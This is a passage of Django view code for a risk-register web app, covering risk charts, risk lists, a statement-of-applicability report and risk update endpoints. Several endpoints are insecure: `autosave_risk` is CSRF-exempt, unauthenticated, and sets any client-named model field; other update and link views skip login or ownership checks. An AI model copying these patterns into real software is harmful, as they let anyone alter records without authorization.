        residual_likelihood = risk.residual_likelihood
        residual_impact = risk.residual_impact

        if residual_likelihood is None or residual_impact is None:
            residual_level = 'N/A'
        else:
            # Calculate the residual score as likelihood x impact
            residual_score = residual_likelihood * residual_impact

            # Define risk levels based on the residual score
            if residual_score <= 6:  # Low: 1-6
                residual_level = 'low'
            elif 7 <= residual_score <= 12:  # Medium: 7-12
                residual_level = 'medium'
            elif residual_score >= 15:  # High: 15-25
                residual_level = 'high'
            else:
                residual_level = 'unknown'  # Catch-all for unexpected cases

        # Generate admin change URL for Risk
        try:
            risk_url = f'/risk/{risk.id}'
        except Exception as e:
            print(f"Error reversing URL for risk {risk.id}: {e}")
            risk_url = "#"

        # Add Risk node with URL and risk level
        add_node(risk_id, risk.title, 'risk', url=risk_url, risk_level=residual_level)

        # # Add Category node
        # if risk.category:
        #     category_id = f"category_{risk.category.id}"
        #     category_url = reverse('admin:orm_category_change', args=[risk.category.id])
        #     add_node(category_id, risk.category.name, 'category', url=category_url)
        #     links.append({'source': risk_id, 'target': category_id})

        # # Add Mitigation nodes
        # for mitigation in risk.mitigations.all():
        #     mitigation_id = f"mitigation_{mitigation.id}"
        #     mitigation_url = reverse('admin:orm_mitigation_change', args=[mitigation.id])
        #     add_node(mitigation_id, mitigation.title, 'mitigation', url=mitigation_url)
        #     links.append({'source': risk_id, 'target': mitigation_id})

        # # Add Owner nodes (UserProfiles)
        for owner in risk.owners.all():
            owner_id = f"user_{owner.id}"
            # Assuming UserProfile is linked to Django's built-in User model
            owner_url = reverse('admin:auth_user_change', args=[owner.user.id])
            add_node(owner_id, owner.user.username, 'owner', url=owner_url)
            links.append({'source': risk_id, 'target': owner_id})

    context = {
        'nodes': nodes,
        'links': links,
    }
    return render(request, 'risk_network.html', context)
    # Fetch all Risks with related Categories, Portfolios, Mitigations, and Owners
   

from django.contrib.auth.models import User  # Import User model
from django.shortcuts import render
from django.contrib.auth.decorators import login_required

from django.shortcuts import render
from django.contrib.auth.models import User
import matplotlib.pyplot as plt
import io
import base64

def generate_owner_bar_chart(labels, high_risks, medium_risks, low_risks, title):
    # Replace any None values in labels and risk level lists with defaults
    labels = ['Unknown' if label is None else label for label in labels]
    high_risks = [0 if value is None else value for value in high_risks]
    medium_risks = [0 if value is None else value for value in medium_risks]
    low_risks = [0 if value is None else value for value in low_risks]

    # Calculate the total risks for each label
    total_risks = [h + m + l for h, m, l in zip(high_risks, medium_risks, low_risks)]
    overall_total_risks = sum(total_risks)

    # Set up figure size for a full A4 landscape page
    fig, ax = plt.subplots(figsize=(16.5, 11.7))  # A4 landscape size in inches

    # Create stacked horizontal bar chart segments
    bars_low = ax.barh(labels, low_risks, color='green', edgecolor='black', label='Low')
    bars_medium = ax.barh(labels, medium_risks, left=low_risks, color='orange', edgecolor='black', label='Medium')
    bars_high = ax.barh(labels, high_risks, left=[l + m for l, m in zip(low_risks, medium_risks)], color='red', edgecolor='black', label='High')

    # Display individual risk counts and total risks for each bar
    for bar_low, bar_medium, bar_high, total, low, medium, high in zip(bars_low, bars_medium, bars_high, total_risks, low_risks, medium_risks, high_risks):
        if low > 0:
            ax.text(bar_low.get_width() / 2, bar_low.get_y() + bar_low.get_height() / 2, f'{low}', ha='center', va='center', fontsize=11, color='white')
        if medium > 0:
            ax.text(bar_medium.get_x() + bar_medium.get_width() / 2, bar_medium.get_y() + bar_medium.get_height() / 2, f'{medium}', ha='center', va='center', fontsize=11, color='black')
        if high > 0:
            ax.text(bar_high.get_x() + bar_high.get_width() / 2, bar_high.get_y() + bar_high.get_height() / 2, f'{high}', ha='center', va='center', fontsize=11, color='white')

        ax.text(total + 0.5, bar_high.get_y() + bar_high.get_height() / 2, f'{total}', ha='center', fontsize=12, fontweight='bold')

    ax.set_xlabel('Number of Risks', fontsize=14)
    ax.set_ylabel('Owners', fontsize=14)
    ax.set_title(f'{title}\nTotal Risks: {overall_total_risks}', loc='left', fontsize=16, fontweight='bold', pad=30)
    ax.tick_params(axis='y', labelsize=12)
    ax.legend(fontsize=12, loc='upper right')
    plt.tight_layout()

    buffer = io.BytesIO()
    plt.savefig(buffer, format='png')
    plt.close()
    buffer.seek(0)
    image_base64 = base64.b64encode(buffer.read()).decode('utf-8')
    return f"data:image/png;base64,{image_base64}"

# from django.shortcuts import render
# from django.db.models import Count, Q
# from matplotlib import pyplot as plt
# import io
# import base64

# def generate_owner_bar_chart(labels, high_risks, medium_risks, low_risks, title):
#     labels = ['Unknown' if label is None else label for label in labels]
#     high_risks = [0 if value is None else value for value in high_risks]
#     medium_risks = [0 if value is None else value for value in medium_risks]
#     low_risks = [0 if value is None else value for value in low_risks]

#     total_risks = [h + m + l for h, m, l in zip(high_risks, medium_risks, low_risks)]
#     overall_total_risks = sum(total_risks)

#     fig, ax = plt.subplots(figsize=(16.5, 11.7))  # A4 landscape size in inches

#     bars_low = ax.barh(labels, low_risks, color='green', edgecolor='black', label='Low')
#     bars_medium = ax.barh(labels, medium_risks, left=low_risks, color='orange', edgecolor='black', label='Medium')
#     bars_high = ax.barh(labels, high_risks, left=[l + m for l, m in zip(low_risks, medium_risks)], color='red', edgecolor='black', label='High')

#     for bar_low, bar_medium, bar_high, total, low, medium, high in zip(bars_low, bars_medium, bars_high, total_risks, low_risks, medium_risks, high_risks):
#         if low > 0:
#             ax.text(bar_low.get_width() / 2, bar_low.get_y() + bar_low.get_height() / 2, f'{low}', ha='center', va='center', fontsize=11, color='white')
#         if medium > 0:
#             ax.text(bar_medium.get_x() + bar_medium.get_width() / 2, bar_medium.get_y() + bar_medium.get_height() / 2, f'{medium}', ha='center', va='center', fontsize=11, color='black')
#         if high > 0:
#             ax.text(bar_high.get_x() + bar_high.get_width() / 2, bar_high.get_y() + bar_high.get_height() / 2, f'{high}', ha='center', va='center', fontsize=11, color='white')

#         ax.text(total + 0.5, bar_high.get_y() + bar_high.get_height() / 2, f'{total}', ha='center', fontsize=12, fontweight='bold')

#     ax.set_xlabel('Number of Risks', fontsize=14)
#     ax.set_ylabel('Owners', fontsize=14)
#     ax.set_title(f'{title}\nTotal Risks: {overall_total_risks}', loc='left', fontsize=16, fontweight='bold', pad=30)
#     ax.tick_params(axis='y', labelsize=12)
#     ax.legend(fontsize=12, loc='upper right')
#     plt.tight_layout()

#     buffer = io.BytesIO()
#     plt.savefig(buffer, format='png')
#     plt.close()
#     buffer.seek(0)
#     image_base64 = base64.b64encode(buffer.read()).decode('utf-8')
#     return f"data:image/png;base64,{image_base64}"



from django.db.models import ExpressionWrapper, F, IntegerField
from django.contrib.auth.decorators import login_required
from django.shortcuts import render
from django.urls import reverse
from .models import UserProfile, Risk

from django.http import JsonResponse

@login_required
def risk_chart_owner_view(request):
    chart_data = {}
    user_profile = get_object_or_404(UserProfile, user=request.user)

    # Fetch all portfolios associated with the user
    portfolios = user_profile.portfolios.all()

    # Get selected portfolios from the request
    selected_portfolios = request.GET.getlist('portfolios', portfolios.values_list('id', flat=True))

    if request.user.is_superuser:
        owner_data = UserProfile.objects.prefetch_related("owned_risks")
    else:
        owner_data = UserProfile.objects.filter(
            owned_risks__portfolio__id__in=selected_portfolios
        ).distinct().prefetch_related("owned_risks")

    # Iterate over each owner and their risks
    for owner in owner_data:
        risks = owner.owned_risks.filter(portfolio__id__in=selected_portfolios)

        # Annotate and classify risks
        risks = risks.annotate(
            residual_score=ExpressionWrapper(
                F('residual_likelihood') * F('residual_impact'), output_field=IntegerField()
            )
        )
        low_risks = risks.filter(residual_score__lte=6)
        medium_risks = risks.filter(residual_score__range=(8, 12))
        high_risks = risks.filter(residual_score__gte=15)

        if not (low_risks.exists() or medium_risks.exists() or high_risks.exists()):
            continue

        role_key = owner.role if owner.role else "Unknown Role"

        if role_key not in chart_data:
            chart_data[role_key] = {
                "low": {"count": 0, "risks": []},
                "medium": {"count": 0, "risks": []},
                "high": {"count": 0, "risks": []},
            }

        def add_risks_to_chart(risks, category):
            for risk in risks:
                chart_data[role_key][category]['count'] += 1
                chart_data[role_key][category]['risks'].append({
                    'title': risk.title,
                    'change_url': reverse("risk_detail", args=[risk.id]),
                })

        add_risks_to_chart(low_risks, 'low')
        add_risks_to_chart(medium_risks, 'medium')
        add_risks_to_chart(high_risks, 'high')

    return render(request, "risk_chart_owner.html", {
        "chart_data": chart_data,
        "portfolios": portfolios,
        "selected_portfolios": selected_portfolios,
    })






from django.shortcuts import render
from orm.models import Risk, UserProfile
from django.contrib.auth.decorators import login_required
from django.core.exceptions import ObjectDoesNotExist

# @login_required
# def risk_chart_view_portfolio(request):
#     if request.user.is_superuser:
#         # Fetch all portfolios and their IDs
#         portfolios = Risk.objects.values_list('portfolio', 'portfolio__name').distinct()
#         portfolios = [{"id": p[0], "name": p[1]} for p in portfolios if p[0] is not None]
#     else:
#         try:
#             user_profile = UserProfile.objects.get(user=request.user)
#             portfolios = [{"id": p.id, "name": p.name} for p in user_profile.portfolios.all()]
#         except ObjectDoesNotExist:
#             portfolios = []

#     # Get selected portfolios from query parameters, or select all by default
#     selected_portfolio_ids = request.GET.getlist('portfolios') or [str(portfolio["id"]) for portfolio in portfolios]

#     # Filter risks based on the selected portfolios
#     if request.user.is_superuser:
#         risks = Risk.objects.filter(portfolio__id__in=selected_portfolio_ids)
#     else:
#         risks = Risk.objects.filter(portfolio__id__in=selected_portfolio_ids)

#     chart_data = {}
#     for risk in risks:
#         if not risk.portfolio:
#             continue

#         portfolio_name = risk.portfolio.name
#         risk_score = risk.residual_likelihood * risk.residual_impact
#         level = 'low' if risk_score <= 6 else 'medium' if risk_score <= 12 else 'high'

#         if portfolio_name not in chart_data:
#             chart_data[portfolio_name] = {
#                 'low': {'count': 0, 'risks': []},
#                 'medium': {'count': 0, 'risks': []},
#                 'high': {'count': 0, 'risks': []},
#             }

#         chart_data[portfolio_name][level]['count'] += 1
#         chart_data[portfolio_name][level]['risks'].append({
#             'title': risk.title,
#             'change_url': f'/admin/orm/risk/{risk.id}/change/',
#         })

#     context = {
#         'chart_data': chart_data,
#         'portfolios': portfolios,
#         'selected_portfolios': selected_portfolio_ids,
#     }
#     return render(request, 'risk_chart_portfolio.html', context)


# from django.shortcuts import render
# from django.views.decorators.csrf import csrf_exempt

# from django.shortcuts import render
# from django.contrib.auth.decorators import login_required
# from .models import Portfolio

# from django.shortcuts import render
# from django.contrib.auth.decorators import login_required
# from .models import Portfolio

# @csrf_exempt
# @login_required
# def process_user_input(request):
#     processed_lines = []
#     available_portfolios = Portfolio.objects.filter(user_profiles__user=request.user)  # Adjusted query

#     if request.method == 'POST':
#         user_text = request.POST.get('user_text', '')
#         # Break the input text into lines
#         processed_lines = [line.strip() for line in user_text.splitlines() if line.strip()]

#     return render(request, 'text_input_proposals_page.html', {
#         'processed_lines': processed_lines,
#         'available_portfolios': available_portfolios,
#     })

# from django.shortcuts import redirect
# from django.http import HttpResponse
# from .models import Portfolio, Mitigation, Risk
# from django.shortcuts import render, redirect
# from django.contrib.auth.decorators import login_required
# from orm.models import Mitigation, Risk, Portfolio

# from django.shortcuts import render, redirect
# from django.contrib.auth.decorators import login_required
# from orm.models import Mitigation, Risk, Portfolio, UserProfile

# from django.shortcuts import render, redirect
# from django.contrib.auth.decorators import login_required
# from orm.models import Risk, Mitigation, Portfolio, UserProfile

@login_required
def process_user_input(request):
    """
    Processes user text input and splits it into individual proposals.
    """
    processed_lines = []
    if request.method == "POST":
        user_text = request.POST.get("user_text", "")
        # Break the input text into lines
        processed_lines = [line.strip() for line in user_text.splitlines() if line.strip()]

    # Get available portfolios for the current user
    user_profile = request.user.userprofile
    available_portfolios = user_profile.portfolios.all().order_by("name")

    # Get all categories
    available_categories = Category.objects.all().order_by('name')

    return render(request, "text_input_proposals_page.html", {
        "processed_lines": processed_lines,
        "available_portfolios": available_portfolios,
        "available_categories": available_categories,  # Add categories to the context
    })



















from django.db import connection

from django.db import connection

from django.db import connection, transaction

from django.db import connection, transaction

from django.db import connection, transaction








from django.shortcuts import render
from orm.models import Portfolio, StandardControl, PortfolioControlStatus, Risk
import re

from django.shortcuts import render
from orm.models import Portfolio, StandardControl, PortfolioControlStatus, Risk
import re

def hierarchical_sort_key(key):
    """
    Generate a sorting key that splits the string into major and minor parts.
    E.g., "5.10" becomes (5, 10).
    """
    match = re.match(r"^(\d+)\.(\d+)$", key)
    if match:
        return int(match.group(1)), int(match.group(2))  # Major and minor numbers
    return float('inf'), float('inf')  # Place malformed IDs at the end

from django.http import JsonResponse
from django.shortcuts import get_object_or_404
from orm.models import Portfolio, StandardControl, PortfolioControlStatus

from django.http import JsonResponse
from django.shortcuts import get_object_or_404
from .models import Portfolio, StandardControl, PortfolioControlStatus

def save_soa(request):
    if request.method == "POST":
        print("POST Data Received:", request.POST)

        portfolio_id = request.POST.get('portfolio')
        if not portfolio_id:
            return JsonResponse({'error': 'Portfolio ID is required.'}, status=400)

        portfolio = get_object_or_404(Portfolio, id=portfolio_id)

        try:
            rationales = json.loads(request.POST.get('rationales', '{}'))
            print("Parsed Rationales:", rationales)
        except json.JSONDecodeError as e:
            return JsonResponse({'error': 'Invalid JSON format for rationales.'}, status=400)

        messages = []
        for standard_id, rationale_text in rationales.items():
            try:
                print(f"Processing Standard ID: {standard_id}, Rationale: '{rationale_text}'")
                standard_control = StandardControl.objects.get(id=standard_id)

                rationale_entry, created = PortfolioControlStatus.objects.get_or_create(
                    portfolio=portfolio,
                    standard_control=standard_control,
                )
                rationale_entry.rationale = rationale_text
                rationale_entry.save()

                print(f"Saved: {rationale_entry}")
                messages.append(f"Rationale for {standard_control.control_id} saved successfully.")
            except StandardControl.DoesNotExist:
                return JsonResponse({'error': f'StandardControl with ID {standard_id} does not exist.'}, status=400)
            except Exception as e:
                return JsonResponse({'error': str(e)}, status=400)

        return JsonResponse({'message': 'Rationales saved successfully', 'messages': messages})

    return JsonResponse({'error': 'Invalid request method.'}, status=405)

from django.shortcuts import render, get_object_or_404
from orm.models import Portfolio, StandardControl, PortfolioControlStatus, Risk
from collections import defaultdict
import re
import bleach  # To help clean HTML tags

import bleach
import re
from collections import defaultdict
from django.shortcuts import render, get_object_or_404
from orm.models import Portfolio, StandardControl, Risk, PortfolioControlStatus

from django.contrib.auth.decorators import login_required
from django.shortcuts import render, get_object_or_404
from collections import defaultdict
import bleach
import re

from django.shortcuts import render, get_object_or_404
from collections import defaultdict
import bleach
import re
from django.contrib.auth.decorators import login_required
from .models import Portfolio, StandardControl, Risk, PortfolioControlStatus


@login_required
def generate_soa(request):
    # Fetch only the portfolios assigned to the current user
    user_profile = request.user.userprofile
    portfolios = user_profile.portfolios.all()

    # Fetch distinct standards for dropdowns
    standards = StandardControl.objects.values_list('standard_name', flat=True).distinct()

    # Initialize variables for selected portfolio/standard and results
    selected_portfolio = None
    selected_standard = None
    grouped_results = defaultdict(list)
    section_totals = {}
    grand_total = 0

    if request.method == "POST":
        # Get selected portfolio and standard from the form
        selected_portfolio_id = request.POST.get('portfolio')
        selected_standard_name = request.POST.get('standard')

        if selected_portfolio_id and selected_standard_name:
            try:
                # Fetch the selected portfolio using the user profile's portfolios
                selected_portfolio = get_object_or_404(user_profile.portfolios, id=selected_portfolio_id)
                selected_standard = selected_standard_name
                standard_risks = StandardControl.objects.filter(standard_name=selected_standard)

                # Sort the standard risks by `control_id` (natural hierarchical sorting)
                sorted_standard_risks = sorted(
                    standard_risks,
                    key=lambda sr: (
                        int(sr.control_id.split('.')[0]),  # Major part
                        int(sr.control_id.split('.')[1])   # Minor part
                    )
                )

                # Fetch risks for the selected portfolio
                portfolio_risks = Risk.objects.filter(portfolio=selected_portfolio)

                # Map portfolio risks by control ID, handling rich text titles
                portfolio_risk_titles = {}
                for risk in portfolio_risks:
                    # Clean the title to remove HTML tags and leading/trailing whitespace
                    cleaned_title = bleach.clean(risk.title, tags=[], strip=True).strip()

                    # Match the cleaned title with `control_id` patterns (e.g., number.number or number.number.number)
                    match = re.match(r"^\d+\.\d+(\.\d+)?", cleaned_title)
                    if match:
                        portfolio_risk_titles[match.group(0)] = risk

                # Fetch rationale entries for the selected portfolio
                rationale_entries = {
                    (entry.standard_control_id, entry.portfolio_id): entry
                    for entry in PortfolioControlStatus.objects.filter(portfolio=selected_portfolio)
                }

                # Build the grouped results and totals
                for standard_risk in sorted_standard_risks:
                    section = int(standard_risk.control_id.split('.')[0])  # Extract section (major part)
                    portfolio_risk = portfolio_risk_titles.get(standard_risk.control_id)
                    rationale_entry = rationale_entries.get(
                        (standard_risk.id, selected_portfolio.id),
                        PortfolioControlStatus(portfolio=selected_portfolio, standard_control=standard_risk, rationale=''),
                    )
                    grouped_results[section].append({
                        'standard_control': standard_risk,
                        'portfolio_risk': portfolio_risk,
                        'rationale': rationale_entry.rationale.strip() if rationale_entry.rationale else '',
                    })

                # Calculate totals
                section_totals = {section: len(items) for section, items in grouped_results.items()}
                grand_total = sum(section_totals.values())

            except Exception as e:
                print(f"Error: {e}")
                # Optional: Add an error message to display in the template
                pass

    return render(request, 'soa.html', {
        'portfolios': portfolios,
        'standards': standards,
        'selected_portfolio': selected_portfolio,
        'selected_standard': selected_standard,
        'grouped_results': dict(sorted(grouped_results.items())),
        'section_totals': {int(k): v for k, v in section_totals.items()},  # Ensures keys are integers
        'grand_total': grand_total,
    })

from django.shortcuts import render
from orm.models import Risk, Portfolio, UserProfile, Category

from django.shortcuts import render
from orm.models import Risk, Portfolio, UserProfile, Category

from django.db.models import F
from django.shortcuts import render
from orm.models import Risk, Portfolio, UserProfile, Category

from django.db.models import F
from django.shortcuts import render
from orm.models import Risk, Portfolio, UserProfile, Category

from django.shortcuts import render
from django.db.models import F
from .models import Risk, Portfolio, UserProfile, Category


from django.http import JsonResponse

def update_category(request, risk_id):
    if request.method == 'POST':
        data = json.loads(request.body)
        category_id = data.get('category_id')
        try:
            risk = Risk.objects.get(id=risk_id)
            category = Category.objects.get(id=category_id)
            risk.category = category
            risk.save()
            return JsonResponse({'success': True})
        except Exception as e:
            return JsonResponse({'success': False, 'error': str(e)})
    return JsonResponse({'success': False, 'error': 'Invalid request'})


from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import json

@csrf_exempt
def autosave_risk(request, risk_id):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            field = data.get('field')
            value = data.get('value')

            # Update the corresponding field in the Risk model
            risk = Risk.objects.get(id=risk_id)
            setattr(risk, field, value)
            risk.save()

            return JsonResponse({'success': True})
        except Exception as e:
            return JsonResponse({'success': False, 'error': str(e)})

    return JsonResponse({'success': False, 'error': 'Invalid request method'})



from natsort import natsorted

from django.db.models import Q
from natsort import natsorted
from django.shortcuts import render

from django.shortcuts import render
from django.contrib.auth.decorators import login_required
from django.db.models import F, Q
from natsort import natsorted
from collections import defaultdict

from natsort import natsorted
from django.db.models import Q, F
from django.shortcuts import render
from django.contrib.auth.decorators import login_required

from django.db.models import Q, F
from natsort import natsorted
from django.shortcuts import render
from django.contrib.auth.decorators import login_required
from .models import Risk, Portfolio, UserProfile, Category

from django.db.models import F, Q
from django.shortcuts import render
from natsort import natsorted
from .models import Risk, Portfolio, UserProfile, Category  # Ensure all necessary models are imported

def calculate_countdown(due_date):
    # Assuming you have this function defined elsewhere
    from datetime import datetime
    today = datetime.now().date()
    return (due_date - today).days if due_date else None

def risk_list_view(request):
    """
    View to display a list of risks grouped by portfolio themes with approvals per owner,
    sorted by residual_score in descending order.
    """
    # Extract filter parameters from request
    selected_portfolio_id = request.GET.get('portfolio')
    selected_category_id = request.GET.get('category')
    selected_owner_id = request.GET.get('owner')
    selected_approval_status = request.GET.get('approval_status')

    if request.user.is_superuser:
        risks = Risk.objects.annotate(
            residual_score=F('residual_likelihood') * F('residual_impact')
        ).select_related(
            'category', 'portfolio'
        ).prefetch_related(
            'owners', 'approval_requests__user'
        )
        portfolios = Portfolio.objects.all()
    else:
        user_profile = UserProfile.objects.filter(user=request.user).first()
        if user_profile:
            user_portfolios = user_profile.portfolios.all()
            risks = Risk.objects.filter(
                Q(portfolio__in=user_portfolios) | Q(owners=user_profile)
            ).annotate(
                residual_score=F('residual_likelihood') * F('residual_impact')
            ).select_related('category', 'portfolio').prefetch_related('owners', 'approval_requests').distinct()
            portfolios = Portfolio.objects.filter(
                Q(id__in=user_portfolios.values_list('id', flat=True)) |
                Q(id__in=risks.values_list('portfolio_id', flat=True))
            ).distinct()
        else:
            risks = Risk.objects.none()
            portfolios = Portfolio.objects.none()

    # Apply filters
    if selected_portfolio_id:
        risks = risks.filter(portfolio_id=selected_portfolio_id)
    if selected_category_id:
        risks = risks.filter(category_id=selected_category_id)
    if selected_owner_id:
        risks = risks.filter(owners__id=selected_owner_id)
    if selected_approval_status:
        risks = risks.filter(approval_requests__status=selected_approval_status)

    # Categorize portfolios into themes
    grouped_portfolios = {
        'AVAX': [],
        'Projects': [],
        'Subsidiaries': [],
        'Libraries Sets/ISOs': [],
        'Archived': [],
    }

    for portfolio in portfolios:
        if portfolio.name.lower().startswith('project'):
            grouped_portfolios['Projects'].append(portfolio)
        elif portfolio.name.lower().startswith('sub'):
            grouped_portfolios['Subsidiaries'].append(portfolio)
        elif portfolio.name.lower().startswith('set'):
            grouped_portfolios['Libraries Sets/ISOs'].append(portfolio)
        elif portfolio.name.lower().startswith('archive'):
            grouped_portfolios['Archived'].append(portfolio)
        else:
            grouped_portfolios['AVAX'].append(portfolio)

    # Sort portfolios alphabetically within each theme
    for theme, portfolio_list in grouped_portfolios.items():
        grouped_portfolios[theme] = sorted(portfolio_list, key=lambda p: p.name.lower())

    # Group risks by portfolio and sort by residual_score in descending order
    grouped_risks = {}
    for theme, portfolio_list in grouped_portfolios.items():
        grouped_risks[theme] = []
        for portfolio in portfolio_list:
            # Filter risks for this portfolio and sort by residual_score
            portfolio_risks = risks.filter(portfolio=portfolio).order_by('-residual_score')
            risk_data = []

            for risk in portfolio_risks:
                owner_approvals = {}
                for owner in risk.owners.all():
                    approvals = risk.approval_requests.filter(user=owner).order_by('-due_date')
                    if approvals.exists():
                        latest_approval = approvals.first()
                        owner_approvals[owner] = {
                            'status': latest_approval.status,
                            'last_approved': latest_approval.response_date,
                            'next_approval': latest_approval.due_date,
                            'countdown': calculate_countdown(latest_approval.due_date),
                        }
                    else:
                        owner_approvals[owner] = {
                            'status': 'No approvals',
                            'last_approved': None,
                            'next_approval': None,
                            'countdown': None,
                        }

                risk_data.append({
                    'risk': risk,
                    'owner_approvals': owner_approvals,
                })

            grouped_risks[theme].append((portfolio, risk_data))

    # Total risks count
    total_risks = risks.count()

    context = {
        'grouped_risks': grouped_risks,
        'all_owners': UserProfile.objects.all(),
        'portfolios': portfolios.order_by('name'),
        'categories': Category.objects.all().order_by('name'),
        'total_risks': total_risks,
        'selected_portfolio_id': selected_portfolio_id,
        'selected_category_id': selected_category_id,
        'selected_owner_id': selected_owner_id,
        'selected_approval_status': selected_approval_status,
    }
    return render(request, 'risk_list.html', context)

from django.db.models import F, Q
from django.shortcuts import render
from natsort import natsorted
from .models import Risk, Portfolio, Category, UserProfile, ApprovalRequest  # Adjust imports as per your models

def calculate_countdown(due_date):
    from datetime import datetime
    if due_date:
        today = datetime.now().date()
        delta = (due_date - today).days
        return delta
    return None

from django.db.models import F, Q
from django.shortcuts import render
from natsort import natsorted
from .models import Risk, Portfolio, Category, UserProfile, ApprovalRequest  # Adjust imports as per your models

def calculate_countdown(due_date):
    from datetime import datetime
    if due_date:
        today = datetime.now().date()
        delta = (due_date - today).days
        return delta
    return None
from django.db.models import F, Q
from django.shortcuts import render
from .models import Risk, Portfolio, UserProfile, Category  # Adjust imports as needed
from django.utils import timezone  # Assuming calculate_countdown needs this

from django.db.models import Q, F
from django.shortcuts import render
from .models import Risk, Portfolio, UserProfile, Category

def calculate_countdown(due_date):
    from django.utils import timezone
    if due_date:
        delta = due_date - timezone.now()
        return delta.days
    return None

def risk_list_view_new(request):
    """
    View to display a list of risks grouped by portfolio themes with approvals per owner.
    Risks are sorted by residual_score (descending) then category__name (ascending).
    """
    # Extract filter parameters from request
    selected_portfolio_id = request.GET.get('portfolio')
    selected_category_id = request.GET.get('category')
    selected_owner_id = request.GET.get('owner')
    selected_approval_status = request.GET.get('approval_status')

    # Determine queryset based on user permissions
    if request.user.is_superuser:
        risks = Risk.objects.annotate(
            residual_score=F('residual_likelihood') * F('residual_impact')
        ).select_related(
            'category', 'portfolio'
        ).prefetch_related(
            'owners', 'approval_requests__user', 'procedures', 'related_assets'
        )
        portfolios = Portfolio.objects.all()
    else:
        user_profile = UserProfile.objects.filter(user=request.user).first()
        if user_profile:
            user_portfolios = user_profile.portfolios.all()
            risks = Risk.objects.filter(
                Q(portfolio__in=user_portfolios) | Q(owners=user_profile)
            ).annotate(
                residual_score=F('residual_likelihood') * F('residual_impact')
            ).select_related('category', 'portfolio').prefetch_related(
                'owners', 'approval_requests', 'procedures', 'related_assets'
            ).distinct()
            portfolios = Portfolio.objects.filter(
                Q(id__in=user_portfolios.values_list('id', flat=True)) |
                Q(id__in=risks.values_list('portfolio_id', flat=True))
            ).distinct()
        else:
            risks = Risk.objects.none()
            portfolios = Portfolio.objects.none()

    # Apply filters
    if selected_portfolio_id:
        risks = risks.filter(portfolio_id=selected_portfolio_id)
    if selected_category_id:
        risks = risks.filter(category_id=selected_category_id)
    if selected_owner_id:
        risks = risks.filter(owners__id=selected_owner_id)
    if selected_approval_status:
        risks = risks.filter(approval_requests__status=selected_approval_status)

    # Categorize portfolios into themes
    grouped_portfolios = {
        'AVAX': [],
        'Projects': [],
        'Subsidiaries': [],
        'Libraries Sets/ISOs': [],
        'Archived': [],
    }

    for portfolio in portfolios:
        if portfolio.name.lower().startswith('project'):
            grouped_portfolios['Projects'].append(portfolio)
        elif portfolio.name.lower().startswith('sub'):
            grouped_portfolios['Subsidiaries'].append(portfolio)
        elif portfolio.name.lower().startswith('set'):
            grouped_portfolios['Libraries Sets/ISOs'].append(portfolio)
        elif portfolio.name.lower().startswith('archive'):
            grouped_portfolios['Archived'].append(portfolio)
        else:
            grouped_portfolios['AVAX'].append(portfolio)

    # Sort portfolios alphabetically within each theme
    for theme, portfolio_list in grouped_portfolios.items():
        grouped_portfolios[theme] = sorted(portfolio_list, key=lambda p: p.name.lower())

    # Group risks by portfolio, sorted by residual_score (descending) then category__name (ascending)
    grouped_risks = {}
    for theme, portfolio_list in grouped_portfolios.items():
        grouped_risks[theme] = []
        for portfolio in portfolio_list:
            # Fetch risks for this portfolio
            portfolio_risks = risks.filter(portfolio=portfolio)
            risk_data = []

            for risk in portfolio_risks:
                owner_approvals = {}
                for owner in risk.owners.all():
                    approvals = risk.approval_requests.filter(user=owner).order_by('-due_date')
                    if approvals.exists():
                        latest_approval = approvals.first()
                        owner_approvals[owner] = {
                            'status': latest_approval.status,
                            'last_approved': latest_approval.response_date,
                            'next_approval': latest_approval.due_date,
                            'countdown': calculate_countdown(latest_approval.due_date),
                        }
                    else:
                        owner_approvals[owner] = {
                            'status': 'No approvals',
                            'last_approved': None,
                            'next_approval': None,
                            'countdown': None,
                        }

                risk_data.append({
                    'risk': risk,
                    'owner_approvals': owner_approvals,
                })

            # Append portfolio and its risks to the theme
            if risk_data:  # Only include portfolios with risks
                grouped_risks[theme].append((portfolio, risk_data))

    # Total risks count
    total_risks = risks.count()

    # Prepare context for template
    context = {
        'grouped_risks': grouped_risks,
        'all_owners': UserProfile.objects.all(),
        'portfolios': portfolios.order_by('name'),
        'categories': Category.objects.all().order_by('name'),
        'total_risks': total_risks,
        'selected_portfolio_id': selected_portfolio_id,
        'selected_category_id': selected_category_id,
        'selected_owner_id': selected_owner_id,
        'selected_approval_status': selected_approval_status,
    }
    return render(request, 'risk_list_new.html', context)


@csrf_exempt
def link_risk_to_itasset(request, itasset_id):
    if request.method == 'POST':
        data = json.loads(request.body)
        risk_id = data.get('risk_id')
        try:
            it_asset = ITAsset.objects.get(id=itasset_id)
            risk = Risk.objects.get(id=risk_id)
            it_asset.risks.add(risk)
            return JsonResponse({'success': True})
        except ITAsset.DoesNotExist:
            return JsonResponse({'success': False, 'error': 'IT Asset not found.'})
        except Risk.DoesNotExist:
            return JsonResponse({'success': False, 'error': 'Risk not found.'})

@csrf_exempt
def unlink_risk_from_itasset(request, itasset_id):
    if request.method == 'POST':
        data = json.loads(request.body)
        risk_id = data.get('risk_id')
        try:
            it_asset = ITAsset.objects.get(id=itasset_id)
            risk = Risk.objects.get(id=risk_id)
            it_asset.risks.remove(risk)
            return JsonResponse({'success': True})
        except ITAsset.DoesNotExist:
            return JsonResponse({'success': False, 'error': 'IT Asset not found.'})
        except Risk.DoesNotExist:
            return JsonResponse({'success': False, 'error': 'Risk not found.'})

import json
from django.http import JsonResponse
from django.shortcuts import get_object_or_404
from django.contrib.auth.decorators import login_required
from django.utils.dateparse import parse_date
from html import unescape

from django.shortcuts import redirect

from django.http import JsonResponse
from django.shortcuts import get_object_or_404
from django.contrib.auth.decorators import login_required
from django.utils.dateparse import parse_date
from html import unescape
import json
from orm.models import Risk, Action

@login_required
def update_risk(request, risk_id):
    """
    View to update a Risk model instance. Restricted to owners or superusers.
    Ensures validation for targeted < residual check when no actions exist.
    """
    if request.method == 'POST':
        try:
            risk = get_object_or_404(Risk, id=risk_id)

            # Check permissions
            if not (request.user.is_superuser or request.user.userprofile in risk.owners.all()):
                return JsonResponse({'success': False, 'message': 'Permission denied. You cannot edit this risk.'}, status=403)

            # Parse JSON request body
            data = json.loads(request.body)

            # Update fields
            risk.title = unescape(data.get('title', risk.title))  # Decode HTML entities
            risk.description = unescape(data.get('description', risk.description))  # Decode HTML entities
            risk.category_id = data.get('category', risk.category_id)
            risk.portfolio_id = data.get('portfolio', risk.portfolio_id)
            risk.approval_cycle = data.get('approval_cycle', risk.approval_cycle)

            # Update scores (convert to integers)
